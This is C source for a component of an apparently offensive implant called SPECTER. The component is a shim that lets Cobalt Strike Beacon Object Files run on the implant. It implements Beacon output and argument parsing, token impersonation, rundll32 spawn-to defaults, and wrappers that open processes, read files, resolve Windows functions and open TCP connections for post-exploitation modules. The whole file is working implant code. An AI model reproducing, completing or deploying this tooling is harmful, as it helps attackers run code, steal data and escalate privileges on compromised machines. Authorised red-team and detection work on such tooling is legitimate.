/**
 * SPECTER Implant — Cobalt Strike Beacon API Compatibility Shim
 *
 * Maps the standard Cobalt Strike Beacon API to the SPECTER MODULE_BUS_API.
 * BOFs compiled with the CS beacon.h header call these shim functions,
 * which translate to the appropriate bus operations.
 *
 * The shim is initialized per-module-load via beacon_shim_init(), which
 * stores the bus API pointer for the current BOF execution context.
 */

#include "specter.h"
#include "bus.h"
#include "beacon.h"

/* ------------------------------------------------------------------ */
/*  Internal state — bus API pointer for the active BOF                */
/* ------------------------------------------------------------------ */

static MODULE_BUS_API *g_beacon_bus = NULL;

/* ------------------------------------------------------------------ */
/*  beacon_shim_init — set the bus API for the current BOF             */
/* ------------------------------------------------------------------ */

void beacon_shim_init(MODULE_BUS_API *api) {
    g_beacon_bus = api;
}

/* ------------------------------------------------------------------ */
/*  Helper: map Beacon callback type to bus output type                */
/* ------------------------------------------------------------------ */

static DWORD beacon_type_to_bus(int type) {
    switch (type) {
    case CALLBACK_ERROR:
        return OUTPUT_ERROR;
    case CALLBACK_OUTPUT_OEM:
    case CALLBACK_OUTPUT:
    default:
        return OUTPUT_TEXT;
    }
}

/* ------------------------------------------------------------------ */
/*  Minimal variadic format engine (no CRT vsnprintf)                  */
/*                                                                     */
/*  Supports: %s, %d, %u, %x, %X, %p, %c, %%, %i, %ld, %lu, %lx     */
/*  No width/precision specifiers — adequate for typical BOF usage.    */
/* ------------------------------------------------------------------ */

static int fmt_write_char(char *buf, int pos, int max, char c) {
    if (pos < max)
        buf[pos] = c;
    return pos + 1;
}

static int fmt_write_str(char *buf, int pos, int max, const char *s) {
    if (!s) s = "(null)";
    while (*s) {
        pos = fmt_write_char(buf, pos, max, *s);
        s++;
    }
    return pos;
}

static int fmt_write_uint(char *buf, int pos, int max,
                           unsigned long long val, int base, int uppercase) {
    char tmp[24];
    int  i = 0;
    const char *digits = uppercase ? "0123456789ABCDEF" : "0123456789abcdef";

    if (val == 0) {
        tmp[i++] = '0';
    } else {
        while (val > 0) {
            tmp[i++] = digits[val % base];
            val /= base;
        }
    }
    /* Write in reverse */
    while (i > 0) {
        pos = fmt_write_char(buf, pos, max, tmp[--i]);
    }
    return pos;
}

static int fmt_write_int(char *buf, int pos, int max, long long val) {
    if (val < 0) {
        pos = fmt_write_char(buf, pos, max, '-');
        /* Handle INT_MIN carefully */
        val = -val;
    }
    return fmt_write_uint(buf, pos, max, (unsigned long long)val, 10, 0);
}

/**
 * spec_vformat — minimal printf-like formatter.
 * Returns total characters that would have been written (excluding null).
 */
static int spec_vformat(char *buf, int max, const char *fmt, ULONG_PTR *args) {
    int pos = 0;
    int argn = 0;

    while (*fmt) {
        if (*fmt != '%') {
            pos = fmt_write_char(buf, pos, max, *fmt);
            fmt++;
            continue;
        }
        fmt++; /* skip '%' */

        /* Check for 'l' modifier */
        int is_long = 0;
        if (*fmt == 'l') {
            is_long = 1;
            fmt++;
        }

        switch (*fmt) {
        case 's':
            pos = fmt_write_str(buf, pos, max, (const char *)args[argn++]);
            break;
        case 'd':
        case 'i':
            if (is_long)
                pos = fmt_write_int(buf, pos, max, (long long)(LONG)args[argn++]);
            else
                pos = fmt_write_int(buf, pos, max, (long long)(int)(LONG)args[argn++]);
            break;
        case 'u':
            if (is_long)
                pos = fmt_write_uint(buf, pos, max, (unsigned long long)args[argn++], 10, 0);
            else
                pos = fmt_write_uint(buf, pos, max, (unsigned long long)(DWORD)args[argn++], 10, 0);
            break;
        case 'x':
            if (is_long)
                pos = fmt_write_uint(buf, pos, max, (unsigned long long)args[argn++], 16, 0);
            else
                pos = fmt_write_uint(buf, pos, max, (unsigned long long)(DWORD)args[argn++], 16, 0);
            break;
        case 'X':
            if (is_long)
                pos = fmt_write_uint(buf, pos, max, (unsigned long long)args[argn++], 16, 1);
            else
                pos = fmt_write_uint(buf, pos, max, (unsigned long long)(DWORD)args[argn++], 16, 1);
            break;
        case 'p':
            pos = fmt_write_str(buf, pos, max, "0x");
            pos = fmt_write_uint(buf, pos, max, (unsigned long long)args[argn++], 16, 0);
            break;
        case 'c':
            pos = fmt_write_char(buf, pos, max, (char)(DWORD)args[argn++]);
            break;
        case '%':
            pos = fmt_write_char(buf, pos, max, '%');
            break;
        case '\0':
            /* Trailing '%' at end of string */
            goto done;
        default:
            /* Unknown specifier — output literally */
            pos = fmt_write_char(buf, pos, max, '%');
            if (is_long)
                pos = fmt_write_char(buf, pos, max, 'l');
            pos = fmt_write_char(buf, pos, max, *fmt);
            break;
        }
        fmt++;
    }
done:
    /* Null-terminate if space available */
    if (pos < max)
        buf[pos] = '\0';
    else if (max > 0)
        buf[max - 1] = '\0';
    return pos;
}

/* ------------------------------------------------------------------ */
/*  BeaconOutput — raw output to operator                              */
/* ------------------------------------------------------------------ */

void BeaconOutput(int type, const char *data, int len) {
    if (!g_beacon_bus || !data || len <= 0)
        return;
    g_beacon_bus->output((const BYTE *)data, (DWORD)len,
                          beacon_type_to_bus(type));
}

/* ------------------------------------------------------------------ */
/*  BeaconPrintf — formatted output to operator                        */
/* ------------------------------------------------------------------ */

/**
 * We use a fixed-size stack buffer and manually extract variadic args
 * via pointer arithmetic (standard C variadic approach won't work in
 * PIC without CRT, so we use ULONG_PTR arg array + manual format).
 *
 * Note: In PIC context, we use the __builtin_va_* compiler intrinsics
 * which don't require CRT support on x86-64.
 */
void BeaconPrintf(int type, const char *fmt, ...) {
    if (!g_beacon_bus || !fmt)
        return;

    char buf[1024];

    /*
     * Extract variadic arguments.  On x86-64 Windows ABI, the first 4
     * args are in rcx/rdx/r8/r9.  'type' is arg0 (rcx), 'fmt' is arg1
     * (rdx), so variadic args start at arg2 (r8).
     *
     * We use __builtin_va_list which works in both MinGW PIC and GCC
     * test builds.
     */
    __builtin_va_list ap;
    __builtin_va_start(ap, fmt);

    /* Collect up to 16 variadic arguments into an array */
    ULONG_PTR args[16];
    /* We don't know the exact count, so pre-read a reasonable number.
     * spec_vformat only consumes as many as the format string needs. */
    for (int i = 0; i < 16; i++) {
        args[i] = __builtin_va_arg(ap, ULONG_PTR);
    }
    __builtin_va_end(ap);

    int len = spec_vformat(buf, (int)sizeof(buf), fmt, args);
    if (len > (int)sizeof(buf) - 1)
        len = (int)sizeof(buf) - 1;

    g_beacon_bus->output((const BYTE *)buf, (DWORD)len,
                          beacon_type_to_bus(type));
}

/* ------------------------------------------------------------------ */
/*  Data parser — BeaconDataParse / Extract / Int / Short / Length      */
/* ------------------------------------------------------------------ */

void BeaconDataParse(datap *parser, char *buffer, int size) {
    if (!parser)
        return;
    parser->original = buffer;
    parser->buffer   = buffer;
    parser->length   = size;
    parser->size     = size;
}

int BeaconDataInt(datap *parser) {
    if (!parser || parser->size < 4)
        return 0;

    /* Cobalt Strike uses big-endian (network byte order) for ints */
    unsigned char *p = (unsigned char *)parser->buffer;
    int value = ((int)p[0] << 24) |
                ((int)p[1] << 16) |
                ((int)p[2] << 8)  |
                ((int)p[3]);

    parser->buffer += 4;
    parser->size   -= 4;
    return value;
}

short BeaconDataShort(datap *parser) {
    if (!parser || parser->size < 2)
        return 0;

    unsigned char *p = (unsigned char *)parser->buffer;
    short value = (short)(((int)p[0] << 8) | (int)p[1]);

    parser->buffer += 2;
    parser->size   -= 2;
    return value;
}

int BeaconDataLength(datap *parser) {
    if (!parser)
        return 0;
    return parser->size;
}

char *BeaconDataExtract(datap *parser, int *out_len) {
    if (!parser || parser->size < 4)  {
        if (out_len) *out_len = 0;
        return NULL;
    }

    /* Length-prefixed: 4-byte big-endian length + data */
    int len = BeaconDataInt(parser);
    if (len < 0 || len > parser->size) {
        if (out_len) *out_len = 0;
        return NULL;
    }

    char *data = parser->buffer;
    parser->buffer += len;
    parser->size   -= len;

    if (out_len) *out_len = len;
    return data;
}

/* ------------------------------------------------------------------ */
/*  Format buffer — Alloc / Append / Printf / ToString / Free / Int    */
/* ------------------------------------------------------------------ */

void BeaconFormatAlloc(formatp *format, int maxsz) {
    if (!format)
        return;

    if (maxsz <= 0)
        maxsz = BEACON_FORMAT_ALLOC_MAX;
    if (maxsz > BEACON_FORMAT_ALLOC_MAX)
        maxsz = BEACON_FORMAT_ALLOC_MAX;

    format->original = NULL;
    format->buffer   = NULL;
    format->length   = 0;
    format->size     = 0;

    if (!g_beacon_bus)
        return;

    char *mem = (char *)g_beacon_bus->mem_alloc((SIZE_T)maxsz, PAGE_READWRITE);
    if (!mem)
        return;

    spec_memset(mem, 0, (SIZE_T)maxsz);
    format->original = mem;
    format->buffer   = mem;
    format->length   = 0;
    format->size     = maxsz;
}

void BeaconFormatReset(formatp *format) {
    if (!format || !format->original)
        return;
    format->buffer = format->original;
    format->length = 0;
}

void BeaconFormatAppend(formatp *format, const char *data, int len) {
    if (!format || !format->original || !data || len <= 0)
        return;

    int remaining = format->size - format->length;
    if (len > remaining)
        len = remaining;

    spec_memcpy(format->original + format->length, data, (SIZE_T)len);
    format->length += len;
    format->buffer  = format->original + format->length;
}

void BeaconFormatPrintf(formatp *format, const char *fmt, ...) {
    if (!format || !format->original || !fmt)
        return;

    int remaining = format->size - format->length;
    if (remaining <= 0)
        return;

    __builtin_va_list ap;
    __builtin_va_start(ap, fmt);

    ULONG_PTR args[16];
    for (int i = 0; i < 16; i++) {
        args[i] = __builtin_va_arg(ap, ULONG_PTR);
    }
    __builtin_va_end(ap);

    int written = spec_vformat(format->original + format->length,
                                remaining, fmt, args);
    if (written > remaining - 1)
        written = remaining - 1;

    format->length += written;
    format->buffer  = format->original + format->length;
}

char *BeaconFormatToString(formatp *format, int *out_len) {
    if (!format || !format->original) {
        if (out_len) *out_len = 0;
        return NULL;
    }
    if (out_len) *out_len = format->length;
    return format->original;
}

void BeaconFormatFree(formatp *format) {
    if (!format || !format->original)
        return;

    if (g_beacon_bus) {
        g_beacon_bus->mem_free(format->original);
    }

    format->original = NULL;
    format->buffer   = NULL;
    format->length   = 0;
    format->size     = 0;
}

void BeaconFormatInt(formatp *format, int value) {
    if (!format || !format->original)
        return;

    /* Append as 4-byte big-endian (network order), matching CS convention */
    unsigned char bytes[4];
    bytes[0] = (unsigned char)((value >> 24) & 0xFF);
    bytes[1] = (unsigned char)((value >> 16) & 0xFF);
    bytes[2] = (unsigned char)((value >>  8) & 0xFF);
    bytes[3] = (unsigned char)((value      ) & 0xFF);

    BeaconFormatAppend(format, (const char *)bytes, 4);
}

/* ------------------------------------------------------------------ */
/*  Token functions                                                    */
/* ------------------------------------------------------------------ */

BOOL BeaconUseToken(HANDLE token) {
    if (!g_beacon_bus)
        return FALSE;
    return g_beacon_bus->token_impersonate(token);
}

void BeaconRevertToken(void) {
    if (!g_beacon_bus)
        return;
    g_beacon_bus->token_revert();
}

/* ------------------------------------------------------------------ */
/*  Utility functions                                                  */
/* ------------------------------------------------------------------ */

BOOL BeaconIsAdmin(void) {
    if (!g_beacon_bus)
        return FALSE;

    /*
     * Check admin by attempting to open the ADMIN$ share token.
     * Simplified: resolve and call IsUserAnAdmin via bus, or
     * check token elevation via NtQueryInformationToken.
     *
     * For now, resolve shell32!IsUserAnAdmin if available.
     */
    typedef BOOL (*fn_IsUserAnAdmin)(void);
    fn_IsUserAnAdmin pIsAdmin = NULL;

    if (g_beacon_bus->resolve) {
        pIsAdmin = (fn_IsUserAnAdmin)g_beacon_bus->resolve(
            "shell32.dll", "IsUserAnAdmin");
    }

    if (pIsAdmin)
        return pIsAdmin();

    return FALSE;
}

/**
 * Default spawn-to paths matching Cobalt Strike defaults.
 * In a full implementation these would come from the malleable profile.
 */
static char g_spawnto_x86[] = "C:\\Windows\\SysWOW64\\rundll32.exe";
static char g_spawnto_x64[] = "C:\\Windows\\System32\\rundll32.exe";

char *BeaconGetSpawnTo(BOOL x86, int *len) {
    char *path;
    if (x86) {
        path = g_spawnto_x86;
    } else {
        path = g_spawnto_x64;
    }
    if (len) {
        *len = (int)spec_strlen(path);
    }
    return path;
}

int toWideChar(const char *src, WCHAR *dst, int max) {
    if (!src || !dst || max <= 0)
        return 0;

    int i = 0;
    while (src[i] && i < max - 1) {
        dst[i] = (WCHAR)(unsigned char)src[i];
        i++;
    }
    dst[i] = 0;
    return i;
}

/* ------------------------------------------------------------------ */
/*  SPECTER extended BOF API — opt-in SPECTER_* prefix                 */
/* ------------------------------------------------------------------ */

PVOID SPECTER_MemAlloc(SIZE_T size) {
    if (!g_beacon_bus)
        return NULL;
    return g_beacon_bus->mem_alloc(size, PAGE_READWRITE);
}

PVOID SPECTER_Resolve(const char *dll_name, const char *func_name) {
    if (!g_beacon_bus || !dll_name || !func_name)
        return NULL;
    return g_beacon_bus->resolve(dll_name, func_name);
}

HANDLE SPECTER_NetConnect(const char *addr, DWORD port) {
    if (!g_beacon_bus || !addr)
        return INVALID_HANDLE_VALUE;
    return g_beacon_bus->net_connect(addr, port, 0);  /* proto=0 → TCP */
}

HANDLE SPECTER_ProcOpen(DWORD pid, DWORD access) {
    if (!g_beacon_bus)
        return INVALID_HANDLE_VALUE;
    return g_beacon_bus->proc_open(pid, access);
}

DWORD SPECTER_FileRead(const char *path, BYTE *buf, DWORD len) {
    if (!g_beacon_bus || !path || !buf || len == 0)
        return 0;
    return g_beacon_bus->file_read(path, buf, len);
}

/* ------------------------------------------------------------------ */
/*  BEACON_API_TABLE — symbol map for COFF loader resolution           */
/* ------------------------------------------------------------------ */

static BEACON_API_ENTRY g_beacon_api_table[] = {
    /* Output */
    { "BeaconOutput",           (PVOID)BeaconOutput          },
    { "BeaconPrintf",           (PVOID)BeaconPrintf          },

    /* Data parser */
    { "BeaconDataParse",        (PVOID)BeaconDataParse       },
    { "BeaconDataInt",          (PVOID)BeaconDataInt         },
    { "BeaconDataShort",        (PVOID)BeaconDataShort       },
    { "BeaconDataLength",       (PVOID)BeaconDataLength      },
    { "BeaconDataExtract",      (PVOID)BeaconDataExtract     },

    /* Format buffer */
    { "BeaconFormatAlloc",      (PVOID)BeaconFormatAlloc     },
    { "BeaconFormatReset",      (PVOID)BeaconFormatReset     },
    { "BeaconFormatAppend",     (PVOID)BeaconFormatAppend    },
    { "BeaconFormatPrintf",     (PVOID)BeaconFormatPrintf    },
    { "BeaconFormatToString",   (PVOID)BeaconFormatToString  },
    { "BeaconFormatFree",       (PVOID)BeaconFormatFree      },
    { "BeaconFormatInt",        (PVOID)BeaconFormatInt       },

    /* Token */
    { "BeaconUseToken",         (PVOID)BeaconUseToken        },
    { "BeaconRevertToken",      (PVOID)BeaconRevertToken     },

    /* Utility */
    { "BeaconIsAdmin",          (PVOID)BeaconIsAdmin         },
    { "BeaconGetSpawnTo",       (PVOID)BeaconGetSpawnTo      },
    { "toWideChar",             (PVOID)toWideChar            },

    /* SPECTER extended API */
    { "SPECTER_MemAlloc",       (PVOID)SPECTER_MemAlloc      },
    { "SPECTER_Resolve",        (PVOID)SPECTER_Resolve       },
    { "SPECTER_NetConnect",     (PVOID)SPECTER_NetConnect    },
    { "SPECTER_ProcOpen",       (PVOID)SPECTER_ProcOpen      },
    { "SPECTER_FileRead",       (PVOID)SPECTER_FileRead      },
};

#define BEACON_API_TABLE_COUNT \
    (sizeof(g_beacon_api_table) / sizeof(g_beacon_api_table[0]))

BEACON_API_ENTRY *beacon_shim_get_table(DWORD *count_out) {
    if (count_out)
        *count_out = (DWORD)BEACON_API_TABLE_COUNT;
    return g_beacon_api_table;
}
